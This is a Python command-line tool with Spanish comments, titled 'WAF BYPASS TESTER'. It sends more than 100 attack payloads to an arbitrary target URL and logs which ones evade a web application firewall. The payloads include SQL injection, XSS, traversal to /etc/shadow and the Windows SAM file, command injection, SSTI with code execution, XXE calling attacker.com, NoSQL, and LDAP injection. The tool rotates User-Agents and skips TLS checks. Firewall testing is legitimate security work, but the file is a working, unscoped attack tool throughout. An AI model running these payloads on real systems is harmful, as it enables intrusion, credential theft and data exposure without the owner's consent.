#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WAF BYPASS TESTER - Herramienta avanzada de pruebas de bypass de WAF
Más de 100 payloads organizados por tipo de ataque
"""

import requests
import argparse
import sys
import time
import random
from urllib.parse import quote, urlparse, parse_qs, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import json

# Desactivar advertencias SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WAFAuditor:
    def __init__(self, target_url, method="GET", param="test", delay=0, 
                 threads=5, proxy=None, cookies=None, headers=None):
        self.target_url = target_url
        self.method = method.upper()
        self.param = param
        self.delay = delay
        self.threads = threads
        self.proxies = {'http': proxy, 'https': proxy} if proxy else None
        self.cookies = self.parse_cookies(cookies) if cookies else {}
        
        # Headers por defecto
        self.base_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        
        # Agregar headers personalizados
        if headers:
            self.base_headers.update(headers)
    
    def parse_cookies(self, cookie_string):
        """Parsear string de cookies a dict"""
        cookies = {}
        for cookie in cookie_string.split(';'):
            if '=' in cookie:
                key, value = cookie.strip().split('=', 1)
                cookies[key] = value
        return cookies
    
    def generate_payloads(self):
        """Generar más de 100 payloads organizados por categoría"""
        
        payloads = []
        
        # ==================== SQL INJECTION (30+ payloads) ====================
        sql_payloads = [
            # Basic SQLi
            ("SQLi-Basic-1", "' OR '1'='1"),
            ("SQLi-Basic-2", "' OR 1=1--"),
            ("SQLi-Basic-3", "' OR 1=1#"),
            ("SQLi-Basic-4", "' OR 'a'='a"),
            
            # Union Based
            ("SQLi-Union-1", "' UNION SELECT NULL--"),
            ("SQLi-Union-2", "' UNION SELECT 1,2,3--"),
            ("SQLi-Union-3", "' UNION SELECT @@version,2,3--"),
            ("SQLi-Union-4", "' UNION SELECT user(),database(),version()--"),
            ("SQLi-Union-5", "' UNION SELECT 1,load_file('/etc/passwd'),3--"),
            
            # Error Based
            ("SQLi-Error-1", "' AND extractvalue(1,concat(0x7e,version()))--"),
            ("SQLi-Error-2", "' AND updatexml(1,concat(0x7e,version()),1)--"),
            ("SQLi-Error-3", "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"),
            
            # Blind Boolean
            ("SQLi-Blind-1", "' AND 1=1--"),
            ("SQLi-Blind-2", "' AND 1=2--"),
            ("SQLi-Blind-3", "' AND SUBSTRING(@@version,1,1)='5'--"),
            
            # Time Based
            ("SQLi-Time-1", "' OR SLEEP(5)--"),
            ("SQLi-Time-2", "' OR BENCHMARK(1000000,MD5(1))--"),
            ("SQLi-Time-3", "' OR pg_sleep(5)--"),
            ("SQLi-Time-4", "'; WAITFOR DELAY '00:00:05'--"),
            
            # WAF Bypass Techniques
            ("SQLi-WAF-1", "'/**/OR/**/1=1--"),
            ("SQLi-WAF-2", "'/*!50000OR*/1=1--"),
            ("SQLi-WAF-3", "'/*!50000OR*//**/1=1--"),
            ("SQLi-WAF-4", "'%0AOR%0A1=1--"),
            ("SQLi-WAF-5", "'%0BOR%0B1=1--"),
            ("SQLi-WAF-6", "'%09OR%091=1--"),
            ("SQLi-WAF-7", "'%0COR%0C1=1--"),
            ("SQLi-WAF-8", "'%0DOR%0D1=1--"),
            ("SQLi-WAF-9", "'%20OR%201=1--"),
            ("SQLi-WAF-10", "'%a0OR%a01=1--"),
            ("SQLi-WAF-11", "'+(OR+1=1)+'"),
            ("SQLi-WAF-12", "'||(1=1)||'"),
            ("SQLi-WAF-13", "' XOR (1=1) OR '"),
            ("SQLi-WAF-14", "' DIV (1=1) AND '"),
            ("SQLi-WAF-15", "' = 1 LIKE 1 --"),
        ]
        
        # ==================== XSS (25+ payloads) ====================
        xss_payloads = [
            # Basic XSS
            ("XSS-Basic-1", "<script>alert(1)</script>"),
            ("XSS-Basic-2", "<script>alert(document.domain)</script>"),
            ("XSS-Basic-3", "<script>alert(window.location)</script>"),
            
            # Event Handlers
            ("XSS-Event-1", "<img src=x onerror=alert(1)>"),
            ("XSS-Event-2", "<svg onload=alert(1)>"),
            ("XSS-Event-3", "<body onload=alert(1)>"),
            ("XSS-Event-4", "<iframe src=javascript:alert(1)>"),
            ("XSS-Event-5", "<input autofocus onfocus=alert(1)>"),
            ("XSS-Event-6", "<video><source onerror=alert(1)>"),
            ("XSS-Event-7", "<audio src=x onerror=alert(1)>"),
            ("XSS-Event-8", "<marquee onstart=alert(1)>"),
            
            # JavaScript URI
            ("XSS-JS-URI-1", "javascript:alert(1)"),
            ("XSS-JS-URI-2", "JaVaScRiPt:alert(1)"),
            ("XSS-JS-URI-3", "javascript:alert(document.cookie)"),
            
            # WAF Bypass
            ("XSS-WAF-1", "<img src=x oneonerrorrror=alert(1)>"),
            ("XSS-WAF-2", "<scr<script>ipt>alert(1)</scr</script>ipt>"),
            ("XSS-WAF-3", "<scr\x00ipt>alert(1)</scr\x00ipt>"),
            ("XSS-WAF-4", "<scr\x09ipt>alert(1)</scr\x09ipt>"),
            ("XSS-WAF-5", "<scr\x0Aipt>alert(1)</scr\x0Aipt>"),
            ("XSS-WAF-6", "<scr\x0Cipt>alert(1)</scr\x0Cipt>"),
            ("XSS-WAF-7", "<scr\x0Dipt>alert(1)</scr\x0Dipt>"),
            ("XSS-WAF-8", "><script>alert(1)</script>"),
            ("XSS-WAF-9", "\"><script>alert(1)</script>"),
            ("XSS-WAF-10", "'><script>alert(1)</script>"),
            ("XSS-WAF-11", "</script><script>alert(1)</script>"),
            ("XSS-WAF-12", "<img src=1 href=1 onerror=\"javascript:alert(1)\">"),
        ]
        
        # ==================== PATH TRAVERSAL (15+ payloads) ====================
        path_payloads = [
            ("Path-Basic-1", "../../../etc/passwd"),
            ("Path-Basic-2", "../../../../etc/passwd"),
            ("Path-Basic-3", "../../../../../etc/passwd"),
            ("Path-Basic-4", "..\\..\\..\\windows\\win.ini"),
            
            # Encoded
            ("Path-Enc-1", "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"),
            ("Path-Enc-2", "..%2f..%2f..%2fetc%2fpasswd"),
            ("Path-Enc-3", "..%252f..%252f..%252fetc%252fpasswd"),
            ("Path-Enc-4", "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"),
            
            # Double encoding
            ("Path-Double-1", "....//....//....//etc/passwd"),
            ("Path-Double-2", "..//..//..//etc/passwd"),
            ("Path-Double-3", "..///..///..///etc/passwd"),
            
            # With null bytes
            ("Path-Null-1", "../../../etc/passwd%00"),
            ("Path-Null-2", "../../../etc/passwd%00.jpg"),
            ("Path-Null-3", "../../../etc/passwd%00.html"),
            
            # Absolute path
            ("Path-Abs-1", "/etc/passwd"),
            ("Path-Abs-2", "C:\\windows\\win.ini"),
            
            # Interesting files
            ("Path-File-1", "../../../etc/shadow"),
            ("Path-File-2", "../../../proc/self/environ"),
            ("Path-File-3", "../../../proc/version"),
            ("Path-File-4", "../../../windows/repair/sam"),
        ]
        
        # ==================== COMMAND INJECTION (15+ payloads) ====================
        cmd_payloads = [
            # Basic Command
            ("CMD-Basic-1", "; ls -la"),
            ("CMD-Basic-2", "; id"),
            ("CMD-Basic-3", "; whoami"),
            ("CMD-Basic-4", "; pwd"),
            
            # Pipe based
            ("CMD-Pipe-1", "| ls -la"),
            ("CMD-Pipe-2", "| id"),
            ("CMD-Pipe-3", "| cat /etc/passwd"),
            
            # Backtick
            ("CMD-Backtick-1", "`ls -la`"),
            ("CMD-Backtick-2", "`id`"),
            ("CMD-Backtick-3", "`cat /etc/passwd`"),
            
            # Subshell
            ("CMD-Subshell-1", "$(ls -la)"),
            ("CMD-Subshell-2", "$(id)"),
            ("CMD-Subshell-3", "$(cat /etc/passwd)"),
            
            # WAF Bypass
            ("CMD-WAF-1", "%0A ls -la"),
            ("CMD-WAF-2", "%0A id"),
            ("CMD-WAF-3", "%0D%0A ls -la"),
            ("CMD-WAF-4", "| ls${IFS}-la"),
            ("CMD-WAF-5", ";ls${IFS}-la"),
            ("CMD-WAF-6", "& ping -c 3 127.0.0.1"),
        ]
        
        # ==================== SSTI (10+ payloads) ====================
        ssti_payloads = [
            ("SSTI-Basic-1", "{{7*7}}"),
            ("SSTI-Basic-2", "${7*7}"),
            ("SSTI-Basic-3", "<%= 7*7 %>"),
            ("SSTI-Basic-4", "${{7*7}}"),
            ("SSTI-Basic-5", "#{7*7}"),
            ("SSTI-Basic-6", "*{7*7}"),
            ("SSTI-Basic-7", "@(7*7)"),
            ("SSTI-Basic-8", "{{'7'*7}}"),
            ("SSTI-Basic-9", "{{config}}"),
            ("SSTI-Basic-10", "{{self}}"),
            ("SSTI-Basic-11", "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"),
            ("SSTI-Basic-12", "${T(java.lang.Runtime).getRuntime().exec('id')}"),
        ]
        
        # ==================== XXE (10+ payloads) ====================
        xxe_payloads = [
            ("XXE-Basic-1", "<!DOCTYPE test [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>"),
            ("XXE-Basic-2", "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"),
            ("XXE-Basic-3", "<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>"),
            ("XXE-Basic-4", "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>"),
            ("XXE-External-1", "<!DOCTYPE test [ <!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe; ]>"),
            ("XXE-PHP-1", "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"> %xxe;]>"),
            ("XXE-UTF-1", "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"file:///c:/boot.ini\"> %xxe;]>"),
            ("XXE-SVG-1", "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"300\" version=\"1.1\" height=\"200\"><image xlink:href=\"file:///etc/passwd\"></image></svg>"),
            ("XXE-OOB-1", "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/xxe\"> %xxe;]>"),
        ]
        
        # ==================== JSON INJECTION (8+ payloads) ====================
        json_payloads = [
            ("JSON-Basic-1", '{"username":"admin\'--","password":"any"}'),
            ("JSON-Basic-2", '{"test":"\' OR 1=1--"}'),
            ("JSON-Basic-3", '["\' OR 1=1--"]'),
            ("JSON-Basic-4", '{"$gt": ""}'),
            ("JSON-Basic-5", '{"$ne": ""}'),
            ("JSON-Basic-6", '{"$regex": ".*"}'),
            ("JSON-Basic-7", '{"username": {"$ne": null}, "password": {"$ne": null}}'),
            ("JSON-Basic-8", '{"username": "admin", "password": {"$gt": ""}}'),
            ("JSON-Basic-9", '{"username": "admin", "password": {"$regex": "^.*"}}'),
        ]
        
        # ==================== HTTP PARAMETER POLLUTION (5+ payloads) ====================
        hpp_payloads = [
            ("HPP-Basic-1", "test=val1&test=val2"),
            ("HPP-Basic-2", "test[]=1&test[]=2"),
            ("HPP-Basic-3", "test=1&test=2&test=3"),
            ("HPP-Basic-4", "test=1%26test=2"),
            ("HPP-Basic-5", "test=1;test=2"),
        ]
        
        # ==================== LDAP INJECTION (5+ payloads) ====================
        ldap_payloads = [
            ("LDAP-Basic-1", "*"),
            ("LDAP-Basic-2", "*)(&"),
            ("LDAP-Basic-3", "*)(|(uid=*"),
            ("LDAP-Basic-4", "*))(|(uid=*"),
            ("LDAP-Basic-5", "admin*)((|userPassword=*)"),
            ("LDAP-Basic-6", "*)(uid=*))(|(uid=*"),
        ]
        
        # Combinar todos los payloads
        payloads.extend(sql_payloads)
        payloads.extend(xss_payloads)
        payloads.extend(path_payloads)
        payloads.extend(cmd_payloads)
        payloads.extend(ssti_payloads)
        payloads.extend(xxe_payloads)
        payloads.extend(json_payloads)
        payloads.extend(hpp_payloads)
        payloads.extend(ldap_payloads)
        
        return payloads
    
    def test_payload(self, payload_info):
        """Probar un payload individual"""
        name, payload = payload_info
        
        try:
            headers = self.base_headers.copy()
            
            # Rotar User-Agent
            user_agents = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            ]
            headers['User-Agent'] = random.choice(user_agents)
            
            # Añadir delay si está configurado
            if self.delay > 0:
                time.sleep(self.delay)
            
            response = None
            if self.method == "GET":
                # Crear URL con payload
                parsed_url = urlparse(self.target_url)
                query_params = parse_qs(parsed_url.query)
                query_params[self.param] = payload
                
                # Reconstruir URL
                new_query = urlencode(query_params, doseq=True)
                target_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                
                response = requests.get(
                    target_url,
                    headers=headers,
                    cookies=self.cookies,
                    proxies=self.proxies,
                    verify=False,
                    timeout=15,
                    allow_redirects=True
                )
                
            elif self.method == "POST":
                data = {self.param: payload}
                response = requests.post(
                    self.target_url,
                    data=data,
                    headers=headers,
                    cookies=self.cookies,
                    proxies=self.proxies,
                    verify=False,
                    timeout=15,
                    allow_redirects=True
                )
            
            # Analizar respuesta
            if response is not None:
                return self.analyze_response(name, payload, response)
            else:
                return name, payload, "ERROR", 0, 0, "No response"
                
        except requests.exceptions.Timeout:
            return name, payload, "TIMEOUT", 0, 0, "Request timeout"
        except requests.exceptions.ConnectionError:
            return name, payload, "CONN_ERR", 0, 0, "Connection error"
        except Exception as e:
            return name, payload, "ERROR", 0, 0, str(e)
    
    def analyze_response(self, name, payload, response):
        """Analizar respuesta para detectar WAF"""
        
        status_code = response.status_code
        content_length = len(response.content)
        
        # Palabras clave que indican bloqueo WAF
        block_keywords = [
            'waf', 'blocked', 'forbidden', 'security', 'firewall',
            'cloudflare', 'akamai', 'imperva', 'incapsula', 'f5',
            'barracuda', 'fortinet', 'sucuri', 'mod_security',
            'access denied', 'not allowed', 'malicious', 'suspicious',
            'bad request', 'invalid input', 'sql injection', 'xss',
            'attack detected', 'security policy'
        ]
        
        # Códigos de estado que indican bloqueo
        block_status_codes = [403, 406, 418, 429, 503]
        
        # Detectar bloqueo
        is_blocked = False
        block_reason = ""
        
        # Verificar código de estado
        if status_code in block_status_codes:
            is_blocked = True
            block_reason = f"Status {status_code}"
        
        # Verificar keywords en contenido
        content_lower = response.text.lower()
        for keyword in block_keywords:
            if keyword in content_lower:
                is_blocked = True
                block_reason = f"Keyword: {keyword}"
                break
        
        # Verificar headers de seguridad
        security_headers = [
            'X-Firewall', 'X-WAF', 'X-Protected-By',
            'Server', 'X-Powered-By'
        ]
        
        for header in security_headers:
            if header in response.headers:
                header_value = response.headers[header].lower()
                for waf in ['cloudflare', 'akamai', 'imperva', 'f5', 'mod_security']:
                    if waf in header_value:
                        is_blocked = True
                        block_reason = f"WAF: {waf}"
                        break
        
        # Determinar resultado
        if is_blocked:
            result = "BLOCKED"
        elif status_code >= 400:
            result = f"ERROR_{status_code}"
        else:
            result = "PASSED"
        
        return name, payload, result, status_code, content_length, block_reason
    
    def run_scan(self):
        """Ejecutar escaneo completo"""
        
        print(f"""
╔══════════════════════════════════════════════════════════╗
║                 WAF BYPASS TESTER v2.0                   ║
║                 Más de 100 pruebas                       ║
╚══════════════════════════════════════════════════════════╝
        
[+] Target: {self.target_url}
[+] Method: {self.method}
[+] Parameter: {self.param}
[+] Threads: {self.threads}
[+] Delay: {self.delay}s
        """)
        
        # Generar payloads
        payloads = self.generate_payloads()
        print(f"[+] Total payloads: {len(payloads)}")
        print("[+] Iniciando escaneo...\n")
        
        results = []
        bypass_found = []
        
        # Ejecutar en paralelo
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            future_to_payload = {
                executor.submit(self.test_payload, payload): payload 
                for payload in payloads
            }
            
            for i, future in enumerate(as_completed(future_to_payload), 1):
                try:
                    name, payload, result, status, length, reason = future.result()
                    
                    # Mostrar progreso
                    progress = f"[{i:03d}/{len(payloads):03d}]"
                    
                    if result == "PASSED":
                        print(f"{progress} ✅ {name:<20} | Status: {status:3d} | Length: {length:6d}")
                        bypass_found.append((name, payload, status, length))
                    elif result == "BLOCKED":
                        print(f"{progress} ❌ {name:<20} | Status: {status:3d} | BLOCKED ({reason})")
                    elif "ERROR" in result:
                        print(f"{progress} ⚠️  {name:<20} | Status: {status:3d} | {result}")
                    else:
                        print(f"{progress} ? {name:<20} | Status: {status:3d} | {result}")
                    
                    results.append({
                        'name': name,
                        'payload': payload,
                        'result': result,
                        'status': status,
                        'length': length,
                        'reason': reason
                    })
                    
                except Exception as e:
                    print(f"[!] Error procesando payload: {e}")
        
        # Mostrar resumen
        self.print_summary(results, bypass_found)
        
        # Exportar resultados si hay bypass
        if bypass_found:
            self.export_results(bypass_found)
        
        return results
    
    def print_summary(self, results, bypass_found):
        """Imprimir resumen del escaneo"""
        
        print("\n" + "="*80)
        print("RESUMEN DEL ESCANEO")
        print("="*80)
        
        # Estadísticas
        total = len(results)
        blocked = len([r for r in results if r['result'] == 'BLOCKED'])
        passed = len([r for r in results if r['result'] == 'PASSED'])
        errors = total - blocked - passed
        
        print(f"\n📊 ESTADÍSTICAS:")
        print(f"   Total payloads probados: {total}")
        print(f"   Payloads bloqueados: {blocked}")
        print(f"   Posibles bypass encontrados: {passed}")
        print(f"   Errores/Timeouts: {errors}")
        
        if bypass_found:
            print(f"\n🎯 BYPASS ENCONTRADOS ({len(bypass_found)}):")
            print("-"*80)
            
            # Agrupar por categoría
            categories = {}
            for name, payload, status, length in bypass_found:
                category = name.split('-')[0]
                if category not in categories:
                    categories[category] = []
                categories[category].append((name, payload, status, length))
            
            for category, items in categories.items():
                print(f"\n🔹 {category} ({len(items)}):")
                for name, payload, status, length in items[:5]:  # Mostrar solo primeros 5
                    print(f"   • {name}: {payload[:50]}... (Status: {status})")
                if len(items) > 5:
                    print(f"   ... y {len(items)-5} más")
        
        print("\n" + "="*80)
        print("RECOMENDACIONES:")
        
        if bypass_found:
            print("⚠️  Se encontraron posibles vulnerabilidades:")
            print("   1. Verificar manualmente cada bypass encontrado")
            print("   2. Implementar validación de entrada más estricta")
            print("   3. Considerar WAF con reglas actualizadas")
            print("   4. Realizar auditoría de seguridad completa")
        else:
            print("✅ No se encontraron bypass obvios")
            print("   El WAF parece estar protegiendo efectivamente")
        
        print("="*80)
    
    def export_results(self, bypass_found):
        """Exportar resultados a archivo"""
        
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        filename = f"waf_bypass_results_{timestamp}.txt"
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(f"WAF Bypass Test Results - {timestamp}\n")
            f.write(f"Target: {self.target_url}\n")
            f.write(f"Method: {self.method}\n")
            f.write(f"Parameter: {self.param}\n")
            f.write("="*60 + "\n\n")
            
            for name, payload, status, length in bypass_found:
                f.write(f"[{name}]\n")
                f.write(f"Payload: {payload}\n")
                f.write(f"Status: {status} | Length: {length}\n")
                f.write("-"*40 + "\n")
        
        print(f"\n📄 Resultados exportados a: {filename}")

def main():
    parser = argparse.ArgumentParser(
        description='Herramienta avanzada de pruebas WAF bypass - Más de 100 payloads',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos de uso:
  python3 waf_test.py -u https://ejemplo.com
  python3 waf_test.py -u https://ejemplo.com -m POST -p username
  python3 waf_test.py -u https://ejemplo.com --threads 10 --delay 0.5
  python3 waf_test.py -u https://ejemplo.com --cookies "session=abc123" --proxy http://127.0.0.1:8080
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='URL objetivo')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='Método HTTP')
    parser.add_argument('-p', '--param', default='test', help='Parámetro a probar')
    parser.add_argument('-t', '--threads', type=int, default=5, help='Número de threads (default: 5)')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Delay entre requests en segundos')
    parser.add_argument('--proxy', help='Proxy (ej: http://127.0.0.1:8080)')
    parser.add_argument('--cookies', help='Cookies (ej: "session=abc123; token=xyz")')
    
    args = parser.parse_args()
    
    # Crear y ejecutar auditor
    auditor = WAFAuditor(
        target_url=args.url,
        method=args.method,
        param=args.param,
        delay=args.delay,
        threads=args.threads,
        proxy=args.proxy,
        cookies=args.cookies
    )
    
    try:
        auditor.run_scan()
    except KeyboardInterrupt:
        print("\n[!] Escaneo interrumpido por el usuario")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
